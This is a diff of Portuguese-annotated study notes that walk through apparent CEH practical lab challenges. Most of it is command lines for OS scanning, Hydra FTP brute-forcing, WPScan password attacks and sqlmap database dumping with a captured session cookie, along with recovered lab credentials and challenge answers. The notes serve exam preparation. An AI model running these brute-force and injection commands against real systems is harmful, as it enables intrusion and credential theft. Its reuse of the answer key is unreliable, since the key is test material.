@@ -85,8 +85,7 @@ ftp 192.168.10.111
 ### USERNAME: nick
 ### PASSWORD: apple
 #### ~/Desktop/w_domain.txt
-cd Desktop # CONECTADO VIA FTP
-get w_domain.txt
+get Desktop/w_domain.txt # CONECTADO VIA FTP
 exit
 cat w_domain.com
 ### INFO: "id":"7867721010"
@@ -159,49 +158,80 @@ owasp-zap
 #------------------------------#
 
 
-# ⚠️ PART III - Challenge 11 💬ANSWER: 36💬
-nmap -p 21,80,445,3389 -O 192.168.10/24
-### INFO: 3389/tcp  closed  ms-wbt-server
-find / -name users.txt 2>/dev/null
-hydra -L ~/users.txt -P ~/rockyou.txt ftp://192.168.10.144 
+# PART III - Challenge 11 💬ANSWER: 36💬toor
+sudo su
+nmap -O --osscan-guess --max-os-tries 1 -iL ~/anotacoes/1_2.txt # 192.168.10.111 192.168.10.121 192.168.10.144 192.168.10.222
+### INFO: Nmap scan report for 192.168.10.144
+### INFO: OS details: Microsft Windows Server 2019
+hydra -L users.txt -P rockyou.txt 192.168.10.144 ftp -u -t 4 -w 3
 ### INFO: [21] [ftp] host: 192.168.10.144 login: Parker password: Passw0rd@1234
 
 ftp 192.168.10.144 # NOUTRO TERMINAL
 ### USERNAME: Parker
 ### PASSWORD: Passw0rd@1234
 #### C:\Users\Parker\Documents\w_report.pdf
-ls  # CONECTADO VIA FTP
-ls Documents
-get Documents/w_report.pdf
-bye
+get Documents/w_report.pdf # CONECTADO VIA FTP
+bye # exit
 
 pdftotext Documents/w_report.pdf report.txt
+grep -i "directory listing" report.txt
 grep -i "sensitive files" report.txt
 ### INFO: 12.36 Directory Listing of Sensitive Files
+
+# ⚠️ COMANDOS IMPORTANTES
+# ftp Parker@192.168.10.144
+# ftp ftp://Parker:Passw0rd%401234@192.168.10.144
+# lftp -u Parker,Passw0rd@1234 192.168.10.144
 
 
 #------------------------------#
 
 
-# ⚠️ PART III - Challenge 12 💬ANSWER: orange1234💬
-curl -I http://www.cehorg.com:8080/CEH/wp-login.php
-wpscan --url http://www.cehorg.com:8080/CEH/ --enumerate u
-find / -name password.txt 2>/dev/null
-wpscan --url http://www.cehorg.com:8080/CEH/ -U adam -P ~/Desktop/password.txt
+# PART III - Challenge 12 💬ANSWER: orange1234💬
+nmap -p- --open www.cehorg.com
+whatweb http://www.cehorg.com:80
+whatweb http://www.cehorg.com:8080
+#### GOOGLE: http://www.cehorg.com:8080
+### INFO: You Projects (2) → CEH, DVWA
+whatweb http://www.cehorg.com:8080/CEH
+curl -I http://www.cehorg.com:8080/CEH
+wpscan --url http://www.cehorg.com:8080/CEH/ --enumerate u # Enumerar usuários
+### INFO: User(s) Identified → admin, adam, helen
+wpscan --url http://www.cehorg.com:8080/CEH/ -U adam -P rockyou.txt
 ### INFO: Username: adam, Password: orange1234
+
+# ⚠️ COMANDOS IMPORTANTES
+# curl -I http://www.cehorg.com:80
+# curl -I http://www.cehorg.com:8080
+# curl -I http://www.cehorg.com8080/DVWA
+# curl -I http://www.cehorg.com:8080/CEH/wp-login.php
+# curl http://www.cehorg.com:8080/phpinfo.php
+# wget -r -np -nd http://www.cehorg.com:8080/ # 😃
+# gobuster dir -u http://www.cehorg.com:8080/ -w /usr/share/wordlists/dirb/common.txt
+# gobuster dir -u http://www.cehorg.com:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt
+# dirsearch -u http://www.cehorg.com:8080/
+# dirsearch -u http://www.cehorg.com:8080/ -e php,txt,html -x 403,404
+
+
+# go install github.com/hakluke/hakrawler@latest
+# go install github.com/projectdiscovery/katana/cmd/katana@latest
+# export PATH=$PATH:~/go/bin
+# which hakrawler
+# which katana
+# hakrawler -u http://www.cehorg.com:8080 -d 2
+# katana -u http://www.cehorg.com:8080
 
 
 #------------------------------#
 
 
 # PART III - Challenge 13 💬ANSWER: 3💬
-#### C:\Users\Admin\Desktop\www.moviescope.com_09112024_0538.html
-cd C:\Users\Admin\Desktop\
-dir
-#### GOOGLE: file://C:\Users\Admin\Desktop\www.moviescope.com_09112024_0538.html
-### INFO: Content Security Policy Configuration     1
-### INFO: Clickjacing Protection                    1
-### INFO: MIME Type Confusion                       1
+#### C:\Users\Admin\Videos\www.moviescope.com_09112024_0538.html
+#### GOOGLE: file:///C:\Users\Admin\Videos\www.moviescope.com_09112024_0538.html
+### INFO: Category → Content Security Policy Configuration     Number of vulnerabilities → 1
+### INFO: Category → Clickjacing Protection                    Number of vulnerabilities → 1
+### INFO: Category → MIME Type Confusion                       Number of vulnerabilities → 1
+### INFO: Number od risk categories = 1 + 1 + 1 = 3
 
 
 #------------------------------#
@@ -211,16 +241,23 @@ dir
 #### GOOGLE: http://www.moviescope.com/ # Realizar login 
 ### USERNAME: lee
 ### PASSWORD: test
-### Ctrl + Shift + I (Developer Tools) → Concole → document.cookie
+### PATH: Contacts → View Profile
+### PATH: Ctrl + Shift + I (Developer Tools) → Concole → document.cookie
 ### INFO: "mscope=WNklabw/oq4=; ui-tabs-1=0"
 #### GOOGLE: http://www.moviescope.com/viewprofile.aspx?id=1 
-sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=WNklabw/oq4=; ui-tabs-1=0" -dbs
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=WNklabw/oq4=; ui-tabs-1=0" -dbs --batch
 ### INFO: available databases [9] ... [*] moviescope ...
-sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=WNklabw/oq4=; ui-tabs-1=0" -D moviescope --tables
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=WNklabw/oq4=; ui-tabs-1=0" -D moviescope --tables --batch
 ### INFO: [11 tables] ... User_Login ...
-sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=WNklabw/oq4=; ui-tabs-1=0" -D moviescope -T User_Login --dump
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=WNklabw/oq4=; ui-tabs-1=0" -D moviescope -T User_Login --dump --batch
 ### INFO: [5 entries] ... Uid → 5
 
+#### GOOGLE: WASC ID SQL INJECTION 
+### INFO: WASC-19
+### INFO: http://projects.webappsec.org/w/page/13246963/SQL Injection
+
+# ⚠️ COMANDOS IMPORTANTES
+# sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=WNklabw/oq4=; ui-tabs-1=0" --sql-query="SELECT COUNT(*) FROM User_Login" --batch
 # sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=WNklabw/oq4=; ui-tabs-1=0" --batch --level=1 --risk=1
-#### GOOGLE: WASC SQL INJECTION → http://projects.webappsec.org/w/page/13246963/SQL Injection
-### INFO: Reference ID → WASC-19
+
+
